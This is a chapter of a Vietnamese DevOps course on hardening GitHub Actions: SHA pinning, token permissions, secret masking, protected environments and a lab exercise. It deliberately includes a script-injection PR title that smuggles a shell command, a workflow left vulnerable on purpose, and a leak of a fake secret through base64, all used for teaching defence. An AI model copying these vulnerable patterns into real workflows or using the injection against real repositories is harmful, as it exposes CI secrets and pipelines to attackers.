| Lệnh / cú pháp | Chạy ở | Mục đích |
|---|---|---|
| `git ls-remote <url> 'refs/tags/T' 'refs/tags/T^{}'` | `[WSL]` | Lấy SHA commit của một tag action |
| `grep -n 'uses:' .github/workflows/*.yml` | `[WSL]` | Liệt kê mọi action đang dùng |
| `grep -nE 'uses: [^ ]+@v[0-9]' .github/workflows/*.yml` | `[WSL]` | Tìm action **chưa** ghim SHA |
| `permissions:` / `permissions: {}` | Workflow YAML | Đặt quyền cho `GITHUB_TOKEN` |
| `env: X: ${{ secrets.X }}` rồi `"$X"` | Workflow YAML | Dùng secret đúng cách |
| `echo "::add-mask::$value"` | `[Runner]` | Che một giá trị sinh ra trong job |
| `environment: production` | Workflow YAML | Bắt job qua luật bảo vệ của environment |
| 🟨 `gh secret set TEN` | `[WSL]` (cần GitHub CLI) | Tạo secret từ dòng lệnh, giá trị nhập qua prompt |

---

## 8. Giải thích câu lệnh và tham số

### `git ls-remote`

```bash
git ls-remote https://github.com/docker/login-action 'refs/tags/v4.7.0' 'refs/tags/v4.7.0^{}'
```

```text
81c6f93d4bc991e510b342a00b419b3bb4efc5c6	refs/tags/v4.7.0
```

| Thành phần | Ý nghĩa |
|---|---|
| `ls-remote` | Hỏi server Git danh sách ref (nhánh, tag) và SHA của chúng — **không cần clone** |
| `<url>` | Repo của action: `https://github.com/<owner>/<repo>` |
| `'refs/tags/v4.7.0'` | Chỉ lấy ref này. Đặt trong nháy đơn để shell không hiểu nhầm ký tự đặc biệt |
| `'refs/tags/v4.7.0^{}'` | Ref "đã bóc": nếu là annotated tag, trả về SHA **commit**. Lightweight tag thì dòng này không xuất hiện |

Quy tắc đọc kết quả: **có dòng `^{}` → lấy SHA ở dòng đó; không có → lấy SHA ở dòng duy nhất.**

Lỗi thường gặp: gõ sai tên tag (`4.7.0` thiếu chữ `v`) → **không in gì** và exit code 0 (lệnh không coi "không có ref khớp" là lỗi; thêm `--exit-code` nếu muốn lỗi). Không thấy output → kiểm tra lại tên tag trên trang Releases.

### `permissions:`

```yaml
permissions:
  contents: read      # đọc code (checkout)
  packages: write     # push image lên GHCR
  id-token: write     # xin token OIDC (v3)
```

| Giá trị | Ý nghĩa |
|---|---|
| `read` / `write` / `none` | Mức quyền cho một phạm vi (`write` bao gồm `read`) |
| `contents` | Code, commit, tag, release |
| `packages` | GitHub Packages (GHCR) |
| `id-token` | Chỉ có `write`/`none` — cho phép job xin JWT OIDC |
| `{}` | Không quyền nào |
| `read-all` / `write-all` 🟨 | Mọi phạm vi đọc / ghi — tránh dùng `write-all` |

### `::add-mask::`

```bash
derived="$(printf '%s' "$DEMO_TOKEN" | rev)"
echo "::add-mask::$derived"
echo "Giá trị đảo ngược: $derived"     # log hiện: Giá trị đảo ngược: ***
```

| Thành phần | Ý nghĩa |
|---|---|
| `::add-mask::` | **Workflow command** — dòng in ra stdout có dạng đặc biệt mà runner đọc và hiểu là lệnh, không phải log |
| `$derived` | Giá trị cần che từ giờ trở đi **trong job này** |

⚠️ Bản thân dòng `echo "::add-mask::..."` không làm lộ giá trị (runner xử lý trước khi ghi). Nhưng mọi dòng đã in **trước** lệnh này thì không được che hồi tố.

### `environment:`

```yaml
environment:
  name: production
  url: https://taskhub.example.com    # 🟨 hiện link trên trang Deployments
```

Dạng ngắn `environment: production` là đủ. Nếu environment chưa tồn tại, GitHub **tự tạo** nó **không có luật bảo vệ** nào — cổng duyệt chỉ có khi bạn cấu hình trong Settings.

---

## 9. Bài thực hành từng bước

> Làm trên repo `taskhub` đã có `ci.yml` (bài 02–03) và `release.yml` (bài 03). Mỗi thay đổi đi qua **một nhánh + PR** như mọi khi. Không có bước nào tạo tài nguyên tính phí.

### Bước 1 — Kiểm kê action đang dùng `[WSL]`

```bash
cd ~/projects/taskhub
git switch main && git pull
git switch -c ci/pin-actions-sha
grep -n 'uses:' .github/workflows/*.yml
```

Kết quả minh họa:

```text
.github/workflows/ci.yml:41:        uses: actions/checkout@v7
.github/workflows/ci.yml:46:        uses: actions/setup-java@v6
.github/workflows/ci.yml:56:        uses: actions/upload-artifact@v7
.github/workflows/ci.yml:73:        uses: docker/setup-buildx-action@v4
...
.github/workflows/ci.yml:98:        uses: aquasecurity/trivy-action@v0.36.0
```

Ghi vào `week10/pinning.md` một bảng: action — tag đang dùng — tag cụ thể mới nhất (xem trang Releases của action) — SHA commit.

> Vì sao cần "tag cụ thể"? `@v7` là tag **dời theo bản mới nhất của v7**. Bạn ghim vào **một bản phát hành cụ thể** (`v7.0.1`), không ghim "bất kể v7 đang là gì".

### Bước 2 — Lấy SHA, phân biệt hai loại tag `[WSL]`

```bash
for spec in "actions/checkout v7.0.1" "aquasecurity/trivy-action v0.36.0"; do
  set -- $spec
  echo "== $1 $2"
  git ls-remote "https://github.com/$1" "refs/tags/$2" "refs/tags/$2^{}"
done
```

So sánh hai kết quả với [mục 4.7](#47--chuỗi-cung-ứng-action-bên-thứ-ba-và-ghim-sha). Làm tiếp cho mọi action trong bảng. Đối chiếu SHA của bạn với [bảng tham khảo](labs/reference/README.md) — nếu khác, có thể action đã ra bản mới hơn ngày viết bài (bình thường) hoặc bạn lấy nhầm dòng đối tượng tag (kiểm tra lại `^{}`).

### Bước 3 — Thay vào workflow `[WSL]`

Sửa từng dòng `uses:` theo mẫu, **ghi chú cùng dòng**:

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Kiểm tra không còn action nào ghim theo tag:

```bash
grep -nE 'uses: [^ ]+@v[0-9]' .github/workflows/*.yml || echo "Không còn action ghim theo tag"
```

Trong khi sửa, rà luôn:

- Đầu mỗi file có `permissions: contents: read` chưa?
- Mọi bước `actions/checkout` có `persist-credentials: false` chưa?
- Có chỗ nào `${{ github.event... }}` hoặc `${{ github.head_ref }}` nằm thẳng trong `run:` không?

```bash
grep -nE 'run:.*\$\{\{ *github\.(event|head_ref)' .github/workflows/*.yml || echo "OK"
```

(Lệnh grep này chỉ bắt trường hợp nằm cùng dòng với `run:`. Script nhiều dòng `run: |` phải đọc bằng mắt.)

### Bước 4 — Thêm Dependabot `[WSL]`

Tự viết `.github/dependabot.yml` (đặt trong `.github/`, **không phải** trong `workflows/`) với 3 mục: `github-actions` (`/`), `maven` (`/app`), `docker` (`/docker`), lịch hằng tuần. Viết xong mới đối chiếu với [bản tham khảo](labs/reference/dependabot.yml).

```bash
git add .github/
git commit -m "ci: pin actions to commit SHA and add Dependabot"
git push -u origin ci/pin-actions-sha
```

Mở PR. **CI phải xanh** với các SHA mới. Trong log job, mở bước **Set up job** và tìm các dòng `Download action repository` (mục 12) để xác nhận runner tải đúng SHA bạn ghi. Merge (squash).

Sau khi merge, vào `[GitHub]` **Insights → Dependency graph → Dependabot** để xem Dependabot đã đọc file cấu hình chưa. Nếu có action/thư viện cũ hơn bản mới nhất, PR của Dependabot sẽ xuất hiện trong vài phút đến vài giờ.

### Bước 5 — Kiểm tra quyền mặc định của token `[GitHub]`

**Settings → Actions → General → Workflow permissions**: xác nhận đang chọn mức **chỉ đọc** (read repository contents and packages), và **không** tích "Allow GitHub Actions to create and approve pull requests". Workflow của bạn đã tự xin quyền cần thiết qua `permissions:` — thiết lập mặc định chỉ là lưới an toàn cho workflow quên khai báo.

🟨 Cùng trang, phần **Actions permissions**: đọc tùy chọn **"Require actions to be pinned to a full-length commit SHA"**. Sau Bước 3, bạn có thể bật nó. Thử nghiệm: tạm thời đổi một action về `@v7` trên một nhánh, push, xem lỗi khi chạy; rồi bỏ nhánh đó.

### Bước 6 — Tạo environment `production` có người duyệt `[GitHub]`

1. **Settings → Environments → New environment** → tên `production`.
2. Tích **Required reviewers** → thêm chính bạn. **Không** tích *Prevent self-review*.
3. **Deployment branches and tags** → **Selected branches and tags** → thêm nhánh `main`.
4. Trong environment, thêm **Environment secret** `DEMO_TOKEN` = `demo-not-a-real-secret-12345` và **Environment variable** `DEPLOY_TARGET` = `laptop-demo`.

> ⚠️ Giá trị `DEMO_TOKEN` cố ý là **giá trị giả**. Bước 7 sẽ cố tình làm lộ nó trong log — mà log của repo public **ai cũng đọc được**. Không bao giờ làm thí nghiệm này với secret thật.

### Bước 7 — Workflow demo: cổng duyệt và giới hạn của masking `[WSL]`

Trên nhánh mới `ci/environment-demo`, tạo `.github/workflows/env-demo.yml`:

```yaml
name: Environment demo

on:
  workflow_dispatch:

permissions: {}

jobs:
  deploy-demo:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    environment: production
    env:
      DEMO_TOKEN: ${{ secrets.DEMO_TOKEN }}
      DEPLOY_TARGET: ${{ vars.DEPLOY_TARGET }}
    steps:
      - name: Có secret không? (cách debug an toàn)
        run: |
          if [[ -z "$DEMO_TOKEN" ]]; then
            echo "::error::DEMO_TOKEN rỗng — job có khai báo environment chưa? Tên secret có đúng không?"
            exit 1
          fi
          echo "Độ dài secret: ${#DEMO_TOKEN} ký tự"
          echo "Deploy tới: $DEPLOY_TARGET"

      - name: Masking hoạt động
        run: |
          echo "Giá trị gốc: $DEMO_TOKEN"

      - name: Masking KHÔNG bắt được giá trị biến đổi (chỉ làm với secret giả!)
        run: |
          echo "Đảo ngược: $(printf '%s' "$DEMO_TOKEN" | rev)"
          echo "Base64:    $(printf '%s' "$DEMO_TOKEN" | base64)"

      - name: Đăng ký giá trị biến đổi là secret
        run: |
          reversed="$(printf '%s' "$DEMO_TOKEN" | rev)"
          echo "::add-mask::$reversed"
          echo "Đảo ngược sau add-mask: $reversed"
```

Nút **Run workflow** của `workflow_dispatch` chỉ xuất hiện khi file workflow đã có trên **nhánh mặc định**. Vì vậy: commit, push, mở PR, CI xanh → merge vào `main` trước.

Cách chạy: `[GitHub]` tab **Actions** → **Environment demo** → **Run workflow** → ô *Use workflow from* chọn nhánh → **Run workflow**.

Thử luật **deployment branches** (một phần của bài học): tạo một nhánh từ `main` và push nó lên (`git switch -c test/env-rule && git push -u origin test/env-rule`), rồi chạy workflow với *Use workflow from* = `test/env-rule`. Lần chạy phải **bị từ chối** vì Bước 6 chỉ cho `main` deploy vào `production`. Ghi lại thông báo lỗi, rồi xóa nhánh đó.

### Bước 8 — Duyệt và đọc log `[GitHub]`

1. Chạy workflow với *Use workflow from* = `main`. Lần chạy dừng với trạng thái **Waiting** và thông báo cần review cho `production`.
2. Bấm **Review deployments** → tích `production` → (ghi chú lý do) → **Approve and deploy**.
3. Đọc log từng bước và ghi vào `week10/secrets-lab.md`:
   - Bước "Masking hoạt động" hiện gì?
   - Bước "Đảo ngược / Base64" hiện gì? Giải mã chuỗi base64 trên máy bạn (`echo '<chuỗi>' | base64 -d`) — bạn lấy lại được secret không?
   - Sau `::add-mask::`, dòng đảo ngược hiện gì?
4. Vào trang chính của repo → mục **Deployments** (cột phải) → xem bản ghi ai duyệt, lúc nào.

### Bước 9 — Thí nghiệm script injection (trên nhánh, KHÔNG merge) `[WSL]` `[GitHub]`

```bash
git switch main && git pull
git switch -c demo/injection
```

Tạo `.github/workflows/injection-demo.yml`:

```yaml
name: Injection demo
on: pull_request
permissions: {}
jobs:
  show-title:
    runs-on: ubuntu-24.04
    timeout-minutes: 2
    steps:
      - name: ❌ Có lỗ hổng
        run: |
          echo "Tiêu đề PR: ${{ github.event.pull_request.title }}"
      - name: ✅ An toàn
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Tiêu đề PR: $PR_TITLE"
```

Push và mở PR (draft) với tiêu đề **chính xác**:

```text
demo"; echo "INJECTED-$((6*7))
```

Đọc log: bước ❌ in ra `INJECTED-42` (lệnh của "kẻ tấn công" đã chạy), bước ✅ in nguyên văn tiêu đề. Chụp lại, ghi vào `week10/secrets-lab.md` giải thích **vì sao**.

**Dọn dẹp:** đóng PR **không merge**, xóa nhánh `demo/injection` trên GitHub và local (`git branch -D demo/injection`). Workflow có lỗ hổng không được phép vào `main`.

### Bước 10 — Dọn dẹp và giữ lại

- Xóa file `env-demo.yml` qua một PR nhỏ (`chore: remove environment demo workflow`), hoặc giữ lại nếu muốn xem lại — nó không có quyền gì (`permissions: {}`) và chỉ chạy khi bạn bấm.
- Xóa secret `DEMO_TOKEN` và variable `DEPLOY_TARGET` khỏi environment.
- **Giữ** environment `production` và luật duyệt — v3 sẽ dùng.

---

## 10. Kết quả mong đợi

- [ ] `grep -nE 'uses: [^ ]+@v[0-9]'` không trả về dòng nào trong `.github/workflows/`; mọi action có SHA 40 ký tự + ghi chú `# vX.Y.Z`.
- [ ] Bạn giải thích được vì sao SHA của `trivy-action` là `ed142fd…` mà không phải `a9c7b0f…`.
- [ ] CI xanh trên PR ghim SHA; log **Set up job** hiện đúng các SHA đã ghi.
- [ ] `.github/dependabot.yml` có trên `main`; trang Dependabot của repo đọc được cấu hình.
- [ ] Environment `production` tồn tại, có bạn là người duyệt, chỉ cho nhánh `main`.
- [ ] Log demo: giá trị gốc hiện `***`; giá trị đảo ngược và base64 hiện rõ; sau `::add-mask::` hiện `***`.
- [ ] Chạy demo từ nhánh khác `main` bị từ chối vì luật deployment branches.
- [ ] Thí nghiệm injection in `INJECTED-42` ở bước ❌ và nguyên văn tiêu đề ở bước ✅; nhánh demo đã xóa.
- [ ] Workflow permissions mặc định của repo đang ở mức chỉ đọc.

---

## 11. Các lỗi thường gặp

| Triệu chứng | Nguyên nhân | Cách sửa |
|---|---|---|
| `Resource not accessible by integration` (HTTP 403) | Token thiếu quyền cho thao tác đó (ví dụ tạo release mà không có `contents: write`) | Thêm đúng quyền ở **cấp job** cần nó. Nhớ: khai báo một quyền → quyền khác về `none` |
| Checkout lỗi sau khi thêm `permissions: packages: write` cho job | Quên `contents: read` → `contents` thành `none` | Ghi đủ mọi quyền job cần |
| `denied: permission_denied: write_package` khi push GHCR | Thiếu `packages: write`, **hoặc** package đã được tạo trước đó bằng PAT và chưa cấp quyền cho repo | Thêm quyền; nếu vẫn lỗi: Package settings → **Manage Actions access** → thêm repo, role **Write** ([bài 03](03-github-actions-docker-registry.md)) |
| Lệnh dùng secret báo 401/“empty password” | Secret chưa tạo, gõ sai tên, hoặc là secret environment mà job không khai báo `environment:` | Kiểm tra độ dài `${#VAR}` như Bước 7; đối chiếu tên chính xác (phân biệt hoa thường khi đọc) |
| PR của Dependabot đỏ ở bước cần secret | Workflow do Dependabot kích hoạt không có secret Actions | Tách bước cần secret khỏi CI chạy trên PR; hoặc thêm vào **Dependabot secrets** nếu thật sự cần |
| `Unable to resolve action ..., unable to find version ...` (chữ có thể khác) | SHA gõ sai/thiếu ký tự, hoặc tag không tồn tại | Lấy lại bằng `git ls-remote`, dán đủ 40 ký tự |
| Dependabot không cập nhật ghi chú phiên bản | Ghi chú nằm dòng khác | Đặt `# vX.Y.Z` **cùng dòng** với `uses:` |
| Job đứng **Waiting** mãi | Environment có required reviewers, chưa ai duyệt (hoặc đang wait timer) | Bấm **Review deployments**; kiểm tra bạn có trong danh sách người duyệt |
| `Branch "x" is not allowed to deploy to production due to environment protection rules` (chữ có thể khác) | Luật deployment branches | Chạy từ `main`, hoặc sửa luật nếu thật sự cần |
| Workflow `on: release` không chạy khi Release workflow tạo release | Sự kiện do `GITHUB_TOKEN` tạo không kích hoạt workflow mới | Đúng thiết kế. Gộp việc cần làm vào chính job tạo release, hoặc dùng `workflow_call` 🟦 |
| `git push` từ workflow lỗi xác thực | `persist-credentials: false` | Đúng mong đợi với `taskhub` (không push từ CI). Workflow khác thật sự cần push thì bật lại **chỉ ở workflow đó** |

---

## 12. Đọc log và xử lý lỗi

### 12.1. Bước "Set up job" — nơi đầu tiên cần mở

Mọi job bắt đầu bằng bước **Set up job** (tự động, không có trong YAML). Mở nó ra (minh họa, đã rút gọn):

```text
Current runner version: '2.3xx.x'
Runner Image
  Image: ubuntu-24.04
  Version: 2026xxxx.x
GITHUB_TOKEN Permissions
  Contents: read
  Metadata: read
  Packages: write
Secret source: Actions
Prepare workflow directory
Prepare all required actions
Getting action download info
Download action repository 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' (SHA:3d3c42e5aac5ba805825da76410c181273ba90b1)
Download action repository 'aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25' (SHA:ed142fd0673e97e23eac54620cfb913e5ce36c25)
Complete job name: image
```

Ba điều đọc được ngay:

| Nhóm | Trả lời câu hỏi |
|---|---|
| **GITHUB_TOKEN Permissions** | Job thật sự có quyền gì? (gặp lỗi 403 → nhìn đây trước tiên) |
| **Download action repository … (SHA:…)** | Mỗi action được tải ở **SHA nào**. Với action ghim theo tag (`@v7`), dòng này cho biết tag đó **lúc ấy** trỏ tới đâu — rất quý khi điều tra sự cố chuỗi cung ứng |
| **Secret source** | Job lấy secret từ đâu (Actions; với Dependabot sẽ khác) |

### 12.2. Quy trình xử lý lỗi quyền

```text
Lỗi 403 / "not accessible" / "denied"
  │
  ├─1. "Set up job" → GITHUB_TOKEN Permissions có quyền cần không?
  │      Không → thêm vào permissions: của JOB đó
  │
  ├─2. Có quyền mà vẫn bị từ chối?
  │      GHCR → package có cấp quyền cho repo chưa (Manage Actions access)?
  │      Repo settings → Workflow permissions có bị org/enterprise khóa không?
  │
  └─3. Sự kiện là PR từ fork? → token chỉ đọc theo thiết kế, không sửa được bằng permissions:
```

### 12.3. Đọc log khi nghi ngờ lộ secret

- Tìm `***` trong log: chỗ đó **đã** được che — tốt.
- Tìm các bước in giá trị đã biến đổi: `base64`, `rev`, `jq`, `cut`, in một phần chuỗi (`${VAR:0:5}`).
- Nếu xác nhận lộ (hoặc nghi ngờ hợp lý): **xoay vòng secret ngay** (tạo giá trị mới ở hệ thống gốc → cập nhật secret GitHub → thu hồi giá trị cũ), **sau đó** mới xóa log. Xóa log không thu hồi được thứ đã bị sao chép.

---

## 13. Câu hỏi kiểm tra kiến thức

1. Secret, variable và `GITHUB_TOKEN` khác nhau thế nào về: nơi tạo, có bị che trong log không, thời gian sống?
2. Một secret tên `DB_PASSWORD` tồn tại ở cả cấp repository và environment `production`. Job có `environment: production` nhận giá trị nào? Job không khai báo environment nhận giá trị nào?
3. Masking hoạt động bằng cơ chế gì? Nêu hai cách giá trị secret có thể lộ dù masking đang bật.
4. Vì sao không thể viết `if: secrets.API_TOKEN != ''`? Cách làm thay thế?
5. Job `image` khai báo `permissions: packages: write` và không gì khác. Bước checkout gặp chuyện gì? Vì sao?
6. PR từ fork chạy workflow `on: pull_request` có những gì và không có những gì? Vì sao điều đó an toàn?
7. Giải thích vì sao workflow `pull_request_target` + checkout `head.sha` + `./mvnw verify` là lỗ hổng nghiêm trọng.
8. Viết lại cho an toàn: `run: echo "Branch: ${{ github.head_ref }}"`. Giải thích vì sao bản mới an toàn.
9. Trong sự cố `trivy-action` tháng 3/2026, repo ghi `@0.34.2` và repo ghim SHA commit của bản đó khác nhau thế nào về rủi ro? Ghim SHA có bảo vệ tuyệt đối không?
10. `git ls-remote` trả về hai dòng cho một tag. Dòng nào dùng để ghim, vì sao?
11. Dependabot cập nhật action đã ghim SHA thế nào? Điều kiện để ghi chú phiên bản được cập nhật theo?
12. Environment `production` với required reviewers mang lại gì cho một repo chỉ có một người? Điều kiện gói nào để dùng được trên GitHub Free?
13. Vì sao `taskhub` không có secret `AWS_SECRET_ACCESS_KEY` dù v3 sẽ deploy lên AWS? Quyền nào của `GITHUB_TOKEN` cần cho cách làm đó?
14. `persist-credentials: false` chống lại rủi ro gì?

---

## 14. Bài tập tự làm

> Lời giải: [solutions/04-solutions.md](solutions/04-solutions.md) — chỉ mở sau khi đã tự làm.

**Bài 1 — Rà soát workflow lạ.** Đọc workflow dưới đây (của một "đồng nghiệp"), liệt kê **mọi** vấn đề bảo mật bạn thấy, xếp theo mức độ nghiêm trọng, và viết lại bản an toàn.

```yaml
name: PR helper
on: pull_request_target
permissions: write-all
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some-user/fancy-lint@main
      - run: |
          echo "Checking PR: ${{ github.event.pull_request.title }}"
          echo "${{ secrets.SLACK_WEBHOOK }}" | base64
          ./scripts/lint.sh
      - run: curl -X POST -d "PR ok" ${{ secrets.SLACK_WEBHOOK }}
```

**Bài 2 — Kiểm tra secret sớm.** Viết một bước (đặt đầu job) kiểm tra danh sách secret bắt buộc `REGISTRY_USER`, `REGISTRY_PASSWORD`, `NOTIFY_URL`: secret nào rỗng thì in `::error::` nêu **tên** secret (không in giá trị), kiểm tra hết rồi mới thoát với mã 1 nếu có ít nhất một secret thiếu. Gợi ý: bash indirect expansion `${!name}`.

**Bài 3 — Script ghim SHA.** Viết `scripts/action-sha.sh <owner/repo> <tag>` in ra đúng **một dòng** dạng `owner/repo@<sha-commit> # <tag>`, xử lý đúng cả annotated lẫn lightweight tag, và thoát với mã khác 0 + thông báo rõ nếu tag không tồn tại. Dùng `set -euo pipefail`. Thử với `actions/checkout v7.0.1` và `aquasecurity/trivy-action v0.36.0`.

**Bài 4 — Bảng quyền.** Với 4 job sau, viết khối `permissions:` tối thiểu và giải thích từng dòng: (a) chạy `actionlint` trên code; (b) build image và push lên GHCR; (c) tạo GitHub Release; (d) deploy lên AWS qua OIDC (chỉ cần đọc code + lấy token OIDC).

**Bài 5 — Kế hoạch ứng phó.** Giả sử sáng nay có tin `docker/login-action` bị chiếm quyền giống vụ Trivy, các tag bị dời trong 6 giờ đêm qua. Viết `week10/incident-plan.md` (tối đa 1 trang): bạn kiểm tra gì trong repo `taskhub` (theo thứ tự), dựa vào dòng log nào để biết mình có bị ảnh hưởng, những credential nào cần xoay vòng nếu bị ảnh hưởng và vì sao danh sách đó ngắn.

---

## 15. Tiêu chí đánh giá đã hiểu bài

- [ ] Giải thích được cho người khác vì sao masking không đủ, bằng ví dụ `rev`/`base64` bạn đã tự chạy.
- [ ] Nhìn một khối `permissions:` bất kỳ và nói được job đó **làm được** và **không làm được** gì.
- [ ] Chỉ ra lỗi script injection và `pull_request_target` trong một workflow lạ trong vòng 5 phút (Bài tập 1).
- [ ] Ghim SHA một action mới **không cần xem lại bài**, phân biệt đúng annotated và lightweight tag.
- [ ] Kể lại được một sự cố chuỗi cung ứng có thật và rút ra 3 biện pháp `taskhub` đang áp dụng.
- [ ] Trả lời được câu phỏng vấn "Bạn quản lý secret trong CI/CD thế nào?" trong 2 phút, có nhắc tới quyền tối thiểu, environment và OIDC.

---

## Nguồn tham khảo

| Nguồn | Dùng cho | Kiểm tra ngày |
|---|---|---|
| [GitHub Docs — Secrets reference](https://docs.github.com/en/actions/reference/security/secrets) | Cấp secret, thứ tự ưu tiên, giới hạn số lượng/48 KB, quy tắc đặt tên, tránh dữ liệu có cấu trúc | 2026-10-31 |
| [GitHub Docs — Using secrets in GitHub Actions](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets) | Secret không truyền cho fork và Dependabot, dùng qua `env`, không dùng trong `if:`, `gh secret set` | 2026-10-31 |
| [GitHub Docs — Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) | Script injection và biến môi trường trung gian, ghim SHA, `::add-mask::` cho giá trị biến đổi, `pull_request_target`, Dependabot cập nhật ghi chú cùng dòng, lockfile | 2026-10-31 |
| [GitHub Docs — GITHUB_TOKEN](https://docs.github.com/en/actions/concepts/security/github_token) | Token theo job, hết hạn, sự kiện do token tạo không kích hoạt workflow | 2026-10-31 |
| [GitHub Docs — Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository) | Quyền mặc định của token (repo cá nhân: chỉ đọc), tùy chọn bắt buộc ghim SHA | 2026-10-31 |
| [GitHub Docs — Deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments) | Luật bảo vệ, giới hạn 6 người duyệt, wait timer 43.200 phút, điều kiện gói Free | 2026-10-31 |
| [GitHub Docs — OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect) | Lợi ích OIDC, token ngắn hạn cho một job | 2026-10-31 |
| [GitHub Docs — Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) | Cấu hình `github-actions`, `directory: "/"` | 2026-10-31 |
| [GitHub Docs — About push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection) | Push protection for users bật mặc định cho repo public; push protection cấp repo | 2026-10-31 |
| [GitHub Changelog — Actions policy supports blocking and SHA pinning (2025-08-15)](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/) | Chính sách bắt buộc ghim SHA | 2026-10-31 |
| [GitHub Changelog — Workflow lockfiles in public preview (2026-10-14)](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/) | Lockfile, `gh actions-lock`, `.github/workflows/actions.lock` | 2026-10-31 |
| [actions/checkout — Release v7.0.0](https://github.com/actions/checkout/releases/tag/v7.0.0) | Chặn checkout PR từ fork dưới `pull_request_target`/`workflow_run` | 2026-10-31 |
| [Trivy Security Advisory GHSA-69fq-xp46-6x23](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23) | Sự cố 19/3/2026: phạm vi, phiên bản an toàn, khuyến nghị | 2026-10-31 |
| [CVE-2026-33634 (CIRCL)](https://cve.circl.lu/cve/CVE-2026-33634) | Mã CVE sự cố Trivy | 2026-10-31 |
| [CVE-2025-30066 (CIRCL)](https://cve.circl.lu/cve/CVE-2025-30066) | Sự cố `tj-actions/changed-files` | 2026-10-31 |
| [The Hacker News — GitHub Action compromise puts CI/CD secrets at risk (3/2025)](https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html) | Diễn biến sự cố `tj-actions`, quy mô hơn 23.000 repo, CVSS | 2026-10-31 |
